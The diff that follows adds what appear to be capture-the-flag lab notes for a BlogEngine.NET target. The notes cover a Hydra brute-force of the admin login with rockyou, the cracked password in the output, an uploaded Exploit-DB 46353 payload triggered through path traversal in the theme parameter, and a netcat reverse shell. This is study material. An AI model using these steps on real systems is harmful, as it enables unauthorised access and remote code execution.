@@ -1,0 +1,81 @@
+Intercept POST on Burp Suite
+
+POST /Account/login.aspx?ReturnURL=%2fadmin%2f HTTP/1.1
+Host: 10.10.159.55
+User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:78.0) Gecko/20100101 Firefox/78.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
+Accept-Language: en-US,en;q=0.5
+Accept-Encoding: gzip, deflate
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 767
+Origin: http://10.10.159.55
+Connection: close
+Referer: http://10.10.159.55/Account/login.aspx?ReturnURL=%2fadmin%2f
+Upgrade-Insecure-Requests: 1
+
+__VIEWSTATE=480PQRGTJl3Vpgg58WSqzi1KxP%2B36RZkQZmiOVN2nTdV0kajhCg1ZhFMX6hSOtPsBVm1CS4bpWdi8sMuDAbL1z2K14RHjAFmgksgmFc8rSl%2BDecygU4JzBt6WcsgkBnOVKz7E1xiBA%2Bt2x4KGNWMBnV32lhLK%2FwKEhkX%2FzGQUNvsnHismlSBUXMnDJUq3h5a7iEcXmeZzeWp92A5cQlyj7f2WyOA94recJjn%2BpXoLAvyvH7zweFjB4IeV2yIbkAP%2FhXznDBfEa0zO8xWDG028tL9cZKhgwiNm9ouP%2F%2Bfa38MdETGH21v%2FrZgMD9qDZzQqscZ6EivaFVYiTrt8EkAQ8okxqeWGquVMa%2FWMdBfZMlkpLSb&__EVENTVALIDATION=YoXRZ35qJjT6yMSEu%2FuyhOHZVRrrnyuN8UgXDAgjITwfdGoWG3a0p56Ym6rNV%2FOwrgCO4MZ7m6yeVhFtm9B9%2BhAa5O52I8v%2FoQLGElE%2FK7NlLHSBgF3cjY3wIpL%2BrV5Nrg6RTk2HrZ2RZFZRDKsopPzulf96ml9YoGO%2BBCivJON8VCvm&ctl00%24MainContent%24LoginUser%24UserName=admin&ctl00%24MainContent%24LoginUser%24Password=%5EPASS%5E&ctl00%24MainContent%24LoginUser%24LoginButton=Log+in
+
+
+Update Username ^USER^ Password ^PASS^
+Append :Login Failed
+
+__VIEWSTATE=480PQRGTJl3Vpgg58WSqzi1KxP%2B36RZkQZmiOVN2nTdV0kajhCg1ZhFMX6hSOtPsBVm1CS4bpWdi8sMuDAbL1z2K14RHjAFmgksgmFc8rSl%2BDecygU4JzBt6WcsgkBnOVKz7E1xiBA%2Bt2x4KGNWMBnV32lhLK%2FwKEhkX%2FzGQUNvsnHismlSBUXMnDJUq3h5a7iEcXmeZzeWp92A5cQlyj7f2WyOA94recJjn%2BpXoLAvyvH7zweFjB4IeV2yIbkAP%2FhXznDBfEa0zO8xWDG028tL9cZKhgwiNm9ouP%2F%2Bfa38MdETGH21v%2FrZgMD9qDZzQqscZ6EivaFVYiTrt8EkAQ8okxqeWGquVMa%2FWMdBfZMlkpLSb&__EVENTVALIDATION=YoXRZ35qJjT6yMSEu%2FuyhOHZVRrrnyuN8UgXDAgjITwfdGoWG3a0p56Ym6rNV%2FOwrgCO4MZ7m6yeVhFtm9B9%2BhAa5O52I8v%2FoQLGElE%2FK7NlLHSBgF3cjY3wIpL%2BrV5Nrg6RTk2HrZ2RZFZRDKsopPzulf96ml9YoGO%2BBCivJON8VCvm&ctl00%24MainContent%24LoginUser%24UserName=^USER^&ctl00%24MainContent%24LoginUser%24Password=^PASS^&ctl00%24MainContent%24LoginUser%24LoginButton=Log+in:Login Failed
+
+
+┌──(kali㉿kali)-[~]
+└─$ hydra -l admin -P /usr/share/wordlists/rockyou.txt 10.10.159.55 http-post-form "/Account/login.aspx?ReturnURL=/admin:__VIEWSTATE=480PQRGTJl3Vpgg58WSqzi1KxP%2B36RZkQZmiOVN2nTdV0kajhCg1ZhFMX6hSOtPsBVm1CS4bpWdi8sMuDAbL1z2K14RHjAFmgksgmFc8rSl%2BDecygU4JzBt6WcsgkBnOVKz7E1xiBA%2Bt2x4KGNWMBnV32lhLK%2FwKEhkX%2FzGQUNvsnHismlSBUXMnDJUq3h5a7iEcXmeZzeWp92A5cQlyj7f2WyOA94recJjn%2BpXoLAvyvH7zweFjB4IeV2yIbkAP%2FhXznDBfEa0zO8xWDG028tL9cZKhgwiNm9ouP%2F%2Bfa38MdETGH21v%2FrZgMD9qDZzQqscZ6EivaFVYiTrt8EkAQ8okxqeWGquVMa%2FWMdBfZMlkpLSb&__EVENTVALIDATION=YoXRZ35qJjT6yMSEu%2FuyhOHZVRrrnyuN8UgXDAgjITwfdGoWG3a0p56Ym6rNV%2FOwrgCO4MZ7m6yeVhFtm9B9%2BhAa5O52I8v%2FoQLGElE%2FK7NlLHSBgF3cjY3wIpL%2BrV5Nrg6RTk2HrZ2RZFZRDKsopPzulf96ml9YoGO%2BBCivJON8VCvm&ctl00%24MainContent%24LoginUser%24UserName=^USER^&ctl00%24MainContent%24LoginUser%24Password=^PASS^&ctl00%24MainContent%24LoginUser%24LoginButton=Log+in:Login Failed" -v 
+Hydra v9.2 (c) 2021 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).
+
+Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2021-11-29 18:44:27
+[DATA] max 16 tasks per 1 server, overall 16 tasks, 14344399 login tries (l:1/p:14344399), ~896525 tries per task
+[DATA] attacking http-post-form://10.10.159.55:80/Account/login.aspx?ReturnURL=/admin:__VIEWSTATE=480PQRGTJl3Vpgg58WSqzi1KxP%2B36RZkQZmiOVN2nTdV0kajhCg1ZhFMX6hSOtPsBVm1CS4bpWdi8sMuDAbL1z2K14RHjAFmgksgmFc8rSl%2BDecygU4JzBt6WcsgkBnOVKz7E1xiBA%2Bt2x4KGNWMBnV32lhLK%2FwKEhkX%2FzGQUNvsnHismlSBUXMnDJUq3h5a7iEcXmeZzeWp92A5cQlyj7f2WyOA94recJjn%2BpXoLAvyvH7zweFjB4IeV2yIbkAP%2FhXznDBfEa0zO8xWDG028tL9cZKhgwiNm9ouP%2F%2Bfa38MdETGH21v%2FrZgMD9qDZzQqscZ6EivaFVYiTrt8EkAQ8okxqeWGquVMa%2FWMdBfZMlkpLSb&__EVENTVALIDATION=YoXRZ35qJjT6yMSEu%2FuyhOHZVRrrnyuN8UgXDAgjITwfdGoWG3a0p56Ym6rNV%2FOwrgCO4MZ7m6yeVhFtm9B9%2BhAa5O52I8v%2FoQLGElE%2FK7NlLHSBgF3cjY3wIpL%2BrV5Nrg6RTk2HrZ2RZFZRDKsopPzulf96ml9YoGO%2BBCivJON8VCvm&ctl00%24MainContent%24LoginUser%24UserName=^USER^&ctl00%24MainContent%24LoginUser%24Password=^PASS^&ctl00%24MainContent%24LoginUser%24LoginButton=Log+in:Login Failed
+[VERBOSE] Resolving addresses ... [VERBOSE] resolving done
+[VERBOSE] Page redirected to http://10.10.159.55/admin
+[80][http-post-form] host: 10.10.159.55   login: admin   password: 1qaz2wsx
+[STATUS] attack finished for 10.10.159.55 (waiting for children to complete tests)
+1 of 1 target successfully completed, 1 valid password found
+Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2021-11-29 18:45:24
+
+
+http://10.10.159.55/admin/about.cshtml
+
+
+Your BlogEngine.NET Specification
+
+    Version: 3.3.6.0
+    Configuration: Single blog
+    Trust level: Unrestricted
+    Identity: IIS APPPOOL\Blog
+    Blog provider: XmlBlogProvider
+    Membership provider: XmlMembershipProvider
+    Role provider: XmlRoleProvider
+
+
+https://www.exploit-db.com/exploits/46353
+
+Update the .cs file for your IP and Port and change the name to PostView.ascx
+┌──(kali㉿kali)-[~/Downloads]
+└─$ mv 46353.cs PostView.ascx
+
+Follow the instructions to upload file:
+- Click on Public Posts
+- Click on Welcome To HackPark
+- Click File Manager above the clown image
+- Upload exploit
+- Close and save
+- Start netcat listener and initiate exploit by visiting http://10.10.XXX.XXX/?theme=../../App_Data/files
+
+┌──(kali㉿kali)-[~/Downloads]
+└─$ nc -lvnp 4444
+Ncat: Version 7.92 ( https://nmap.org/ncat )
+Ncat: Listening on :::4444
+Ncat: Listening on 0.0.0.0:4444
+Ncat: Connection from 10.10.159.55.
+Ncat: Connection from 10.10.159.55:49271.
+Microsoft Windows [Version 6.3.9600]
+(c) 2013 Microsoft Corporation. All rights reserved.
+
+c:\windows\system32\inetsrv>
+c:\windows\system32\inetsrv>whoami
+iis apppool\blog
+
